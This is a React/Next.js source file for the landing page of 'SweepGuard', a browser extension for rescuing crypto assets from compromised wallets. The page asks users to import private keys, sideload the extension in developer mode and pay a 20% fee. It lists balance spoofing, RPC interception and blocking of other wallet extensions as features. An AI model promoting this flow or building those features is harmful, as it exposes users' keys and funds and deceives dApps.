'use client'

import { useState } from 'react'
import Link from 'next/link'

const FEATURES = [
  {
    icon: '🔑',
    title: 'Wallet Import',
    description: 'Import compromised wallet + sponsor wallet (gas) with PBKDF2 + AES-GCM encryption',
    details: ['Password-encrypted local storage', 'Auto-lock after 15 min inactivity', 'Keys never leave your browser'],
    status: 'active',
  },
  {
    icon: '🎯',
    title: 'Airdrop Claim + Rescue',
    description: 'Claim airdrops and send tokens to safe wallet in one atomic transaction',
    details: ['Merkle proof support', 'Auto-detect claim data', 'Flashbots on Ethereum, rapid-fire on L2s'],
    status: 'active',
  },
  {
    icon: '🪙',
    title: 'ERC-20 Token Rescue',
    description: 'Rescue any ERC-20 tokens still in compromised wallet to your safe wallet',
    details: ['One-click token rescue', 'Multi-token batch rescue', '20% platform fee applies'],
    status: 'active',
  },
  {
    icon: '💎',
    title: 'Native Token Rescue',
    description: 'Recover native gas tokens (ETH, BNB, etc.) from compromised wallets',
    details: ['ETH, BNB, POL, BERA, HYPE, SEI', 'Sponsor covers all gas', 'Atomic transfer to safe wallet'],
    status: 'active',
  },
  {
    icon: '⛽',
    title: 'Sponsor Wallet',
    description: 'Separate sponsor wallet pays all gas — compromised wallet never needs gas',
    details: ['No gas needed in compromised wallet', 'Sponsor funded separately', 'Gas estimation before execution'],
    status: 'active',
  },
  {
    icon: '🌐',
    title: 'Wallet Provider Injection',
    description: 'Injects as window.ethereum — dApps connect to SweepGuard instead of your real wallet',
    details: ['Balance spoofing for dApps', 'Blocks competing wallet extensions', 'EIP-1193 compliant provider'],
    status: 'active',
  },
  {
    icon: '🔄',
    title: 'Fetch/XHR Interception',
    description: 'Intercepts all RPC calls from dApps and routes them through the extension',
    details: ['eth_getBalance spoofing', 'eth_call interception', 'eth_estimateGas override'],
    status: 'active',
  },
  {
    icon: '📋',
    title: 'Transaction History',
    description: 'Track all rescue transactions with TX hashes and block numbers',
    details: ['Persistent local storage', 'Export transaction log', 'Block explorer links'],
    status: 'active',
  },
]

const STATUS_COLORS: Record<string, { bg: string; text: string; label: string }> = {
  active: { bg: 'bg-green-500/20', text: 'text-green-400', label: '✅ Active' },
  new: { bg: 'bg-cyan-500/20', text: 'text-cyan-400', label: '🆕 New' },
  beta: { bg: 'bg-yellow-500/20', text: 'text-yellow-400', label: '🧪 Beta' },
}

export default function ExtensionPage() {
  const [selectedFeature, setSelectedFeature] = useState<number | null>(null)

  const handleDownloadCRX = () => {
    const link = document.createElement('a')
    link.href = '/sweeptsguard-extension.zip'
    link.download = 'sweeptsguard-extension.zip'
    document.body.appendChild(link)
    link.click()
    document.body.removeChild(link)
  }

  return (
    <main className="min-h-screen bg-[#030305] text-white">
      {/* Background effects */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-0 right-1/4 w-[500px] h-[500px] bg-green-500/[0.04] rounded-full blur-[120px]" />
        <div className="absolute bottom-1/4 left-1/3 w-[400px] h-[400px] bg-cyan-500/[0.03] rounded-full blur-[100px]" />
      </div>

      {/* Nav */}
      <nav className="relative z-10 flex justify-between items-center px-6 py-4 max-w-7xl mx-auto border-b border-white/[0.05]">
        <Link href="/" className="flex items-center gap-2">
          <span className="text-2xl">🛡️</span>
          <span className="text-xl font-bold bg-gradient-to-r from-green-400 to-emerald-400 bg-clip-text text-transparent">
            SweepGuard
          </span>
        </Link>
        <div className="flex gap-4">
          <Link href="/scan" className="text-sm text-white/50 hover:text-green-400 transition-colors">Scan</Link>
          <Link href="/dashboard" className="text-sm text-white/50 hover:text-green-400 transition-colors">Dashboard</Link>
          <Link href="/blog" className="text-sm text-white/50 hover:text-green-400 transition-colors">Blog</Link>
        </div>
      </nav>

      <div className="relative z-10 max-w-5xl mx-auto px-6 py-12">
        {/* Header */}
        <div className="mb-10">
          <h1 className="text-4xl md:text-5xl font-black mb-2">
            🧩 SweepGuard <span className="bg-gradient-to-r from-green-400 to-cyan-400 bg-clip-text text-transparent">Wallet Extension</span>
          </h1>
          <p className="text-gray-500 text-lg">Rescue assets from compromised wallets — sponsor pays gas, funds go to your safe wallet</p>
        </div>

        {/* Extension Preview */}
        <div className="mb-10 p-8 bg-gradient-to-br from-green-500/[0.06] to-cyan-500/[0.06] border border-green-500/20 rounded-2xl backdrop-blur-sm">
          <div className="flex flex-col md:flex-row items-start md:items-center gap-6">
            <div className="w-24 h-24 bg-gradient-to-br from-green-500 to-cyan-500 rounded-2xl flex items-center justify-center text-4xl shadow-[0_0_30px_rgba(0,255,135,0.2)]">
              🛡️
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-3 mb-2">
                <h2 className="text-2xl font-bold">SweepGuard Wallet</h2>
                <span className="px-2 py-0.5 bg-green-500/20 text-green-400 text-xs rounded-full font-medium">v2.1</span>
              </div>
              <p className="text-white/40 mb-4">
                Fund rescue tool using EIP-7702 delegation. Import compromised wallet + sponsor wallet.
                Claim airdrops, rescue ERC-20 tokens, recover native tokens — all without gas in the compromised wallet.
              </p>
              <div className="flex flex-wrap gap-3">
                <button
                  onClick={handleDownloadCRX}
                  className="px-6 py-3 bg-gradient-to-r from-green-500 to-cyan-500 text-black font-semibold rounded-xl hover:shadow-[0_0_30px_rgba(0,255,135,0.3)] transition-all"
                >
                  📦 Download Extension (ZIP)
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Chain Status Notice */}
        <div className="mb-10 p-5 bg-gradient-to-br from-blue-500/[0.06] to-cyan-500/[0.06] border border-blue-500/15 rounded-2xl">
          <div className="flex items-center gap-3 mb-3">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
            <h3 className="text-blue-400 font-semibold">🌐 Active Chain: Base</h3>
          </div>
          <p className="text-white/40 text-sm mb-3">
            SweepGuardRescuer smart contract is currently deployed on <strong className="text-white/70">Base (Chain ID: 8453)</strong> only.
            Contract address: <code className="text-green-400">0xDB671f97bfB72e324A758588456373EEC141400F</code>
          </p>
          <p className="text-white/30 text-xs mb-3">
            More chains coming soon as we deploy contracts. All other chains are disabled until smart contracts are deployed.
          </p>
          <div className="flex flex-wrap gap-2">
            <span className="px-3 py-1.5 bg-green-500/15 border border-green-500/25 rounded-lg text-green-400 text-xs font-medium">✅ Base — Active</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">Ethereum</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">Arbitrum</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">Optimism</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">Polygon</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">BNB Chain</span>
            <span className="px-3 py-1.5 bg-white/[0.03] border border-white/[0.06] rounded-lg text-white/20 text-xs">+11 more</span>
          </div>
        </div>

        {/* How It Works */}
        <div className="mb-10 p-6 bg-white/[0.02] border border-white/[0.06] rounded-2xl">
          <h2 className="text-xl font-bold mb-6">⚙️ How It Works</h2>
          <div className="grid md:grid-cols-4 gap-6">
            {[
              { step: '1', title: 'Set Password', desc: 'Encrypts all wallet keys locally with PBKDF2 + AES-GCM', icon: '🔐' },
              { step: '2', title: 'Import Wallets', desc: 'Import compromised wallet + sponsor wallet (pays gas)', icon: '🔑' },
              { step: '3', title: 'Set Safe Address', desc: 'Where rescued funds will be sent', icon: '🎯' },
              { step: '4', title: 'Rescue', desc: 'Claim airdrops, rescue tokens, recover native tokens', icon: '🚀' },
            ].map((item, i) => (
              <div key={i} className="text-center">
                <div className="w-12 h-12 mx-auto mb-3 bg-green-500/10 rounded-full flex items-center justify-center text-xl">
                  {item.icon}
                </div>
                <div className="text-xs text-green-400 font-medium mb-1">Step {item.step}</div>
                <h3 className="font-semibold mb-1">{item.title}</h3>
                <p className="text-white/40 text-xs">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>

        {/* Features Grid */}
        <div className="mb-10">
          <h2 className="text-2xl font-bold mb-6">🛡️ Features</h2>
          <div className="grid md:grid-cols-2 gap-4">
            {FEATURES.map((feature, i) => {
              const status = STATUS_COLORS[feature.status]
              return (
                <button
                  key={i}
                  onClick={() => setSelectedFeature(selectedFeature === i ? null : i)}
                  className={`p-5 bg-white/[0.02] border rounded-xl backdrop-blur-sm text-left transition-all ${
                    selectedFeature === i
                      ? 'border-green-500/30 bg-green-500/[0.04]'
                      : 'border-white/[0.06] hover:border-white/[0.12]'
                  }`}
                >
                  <div className="flex items-start justify-between mb-2">
                    <span className="text-2xl">{feature.icon}</span>
                    <span className={`px-2 py-0.5 ${status.bg} ${status.text} text-[10px] rounded-full font-medium`}>
                      {status.label}
                    </span>
                  </div>
                  <h3 className="text-lg font-semibold mb-1">{feature.title}</h3>
                  <p className="text-white/40 text-sm mb-3">{feature.description}</p>
                  {selectedFeature === i && (
                    <ul className="space-y-1.5 pt-2 border-t border-white/[0.06]">
                      {feature.details.map((detail, j) => (
                        <li key={j} className="text-xs text-white/50 flex items-center gap-2">
                          <span className="w-1 h-1 bg-green-400 rounded-full" />
                          {detail}
                        </li>
                      ))}
                    </ul>
                  )}
                </button>
              )
            })}
          </div>
        </div>

        {/* Installation Guide */}
        <div className="mb-10 p-6 bg-gradient-to-br from-yellow-500/[0.06] to-orange-500/[0.06] border border-yellow-500/15 rounded-2xl">
          <h2 className="text-xl font-bold mb-4">📦 Installation Guide</h2>
          <div className="space-y-3 text-sm">
            {[
              { step: '1', text: 'Click "Download Extension" above to get the ZIP file' },
              { step: '2', text: 'Extract the ZIP to a folder on your computer' },
              { step: '3', text: 'Open chrome://extensions in your browser' },
              { step: '4', text: 'Enable "Developer mode" (toggle in top right)' },
              { step: '5', text: 'Click "Load unpacked" → select the extracted folder' },
              { step: '6', text: 'SweepGuard Wallet icon appears in toolbar — done! 🎉' },
              { step: '7', text: 'Set a password, import your wallets, and start rescuing' },
            ].map((item) => (
              <div key={item.step} className="flex items-start gap-3">
                <span className="bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded-full text-xs font-bold shrink-0">{item.step}</span>
                <span className="text-white/60">{item.text}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Fee Structure */}
        <div className="mb-10 p-6 bg-gradient-to-br from-purple-500/[0.06] to-blue-500/[0.06] border border-purple-500/15 rounded-2xl">
          <h2 className="text-xl font-bold mb-4">💰 Fee Structure</h2>
          <div className="space-y-4 text-sm">
            <div className="flex items-start gap-3">
              <span className="text-purple-400 text-lg">📊</span>
              <div>
                <div className="font-medium text-white">20% Platform Fee</div>
                <div className="text-white/40">A mandatory 20% fee is deducted from all rescued assets. This fee is enforced at contract level and is non-refundable.</div>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-purple-400 text-lg">⛽</span>
              <div>
                <div className="font-medium text-white">Gas Covered by Sponsor</div>
                <div className="text-white/40">The sponsor wallet pays all gas fees. The compromised wallet never needs gas — any gas sent to it gets instantly stolen by the drainer.</div>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-purple-400 text-lg">🔒</span>
              <div>
                <div className="font-medium text-white">Security</div>
                <div className="text-white/40">All wallet keys are encrypted with PBKDF2 + AES-GCM and stored locally. Keys never leave your browser. Auto-lock after 15 minutes of inactivity.</div>
              </div>
            </div>
          </div>
        </div>

        {/* Supported Chains */}
        <div className="mb-10 p-5 bg-green-500/[0.06] border border-green-500/15 rounded-2xl backdrop-blur-sm">
          <h3 className="text-green-400 font-semibold mb-3">🌐 Supported Networks</h3>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-2 text-xs">
            {[
              { name: 'Base', id: 8453, active: true },
              { name: 'Ethereum', id: 1, active: false },
              { name: 'Arbitrum', id: 42161, active: false },
              { name: 'Optimism', id: 10, active: false },
              { name: 'Polygon', id: 137, active: false },
              { name: 'BNB Chain', id: 56, active: false },
              { name: 'Linea', id: 59144, active: false },
              { name: 'Mantle', id: 5000, active: false },
              { name: 'Berachain', id: 80094, active: false },
              { name: 'HyperEVM', id: 999, active: false },
              { name: 'Sei', id: 1329, active: false },
              { name: 'Ink', id: 57073, active: false },
              { name: 'Unichain', id: 130, active: false },
              { name: 'Plume', id: 98866, active: false },
              { name: 'Plasma', id: 9745, active: false },
              { name: 'Monad', id: 143, active: false },
              { name: 'Gensyn', id: 685689, active: false },
            ].map((chain) => (
              <div
                key={chain.id}
                className={`px-3 py-2 rounded-lg flex items-center gap-2 ${
                  chain.active
                    ? 'bg-green-500/15 border border-green-500/25 text-green-400'
                    : 'bg-white/[0.03] border border-white/[0.06] text-white/20'
                }`}
              >
                <span className={`w-2 h-2 rounded-full ${chain.active ? 'bg-green-400' : 'bg-white/10'}`} />
                {chain.name} ({chain.id})
              </div>
            ))}
          </div>
        </div>

        {/* Browser Support */}
        <div className="p-5 bg-green-500/[0.06] border border-green-500/15 rounded-2xl backdrop-blur-sm">
          <h3 className="text-green-400 font-semibold mb-2">🌐 Browser Support</h3>
          <p className="text-white/40 text-sm mb-4">Works on all Chromium-based browsers</p>
          <div className="flex flex-wrap gap-3">
            {[
              { name: 'Chrome', icon: '🌐' },
              { name: 'Brave', icon: '🦁' },
              { name: 'Edge', icon: '📐' },
              { name: 'Opera', icon: '🔴' },
            ].map((browser) => (
              <div key={browser.name} className="px-4 py-2.5 bg-white/[0.05] rounded-lg text-sm text-white/60 flex items-center gap-2">
                <span>{browser.icon}</span>
                {browser.name}
              </div>
            ))}
          </div>
        </div>
      </div>
    </main>
  )
}
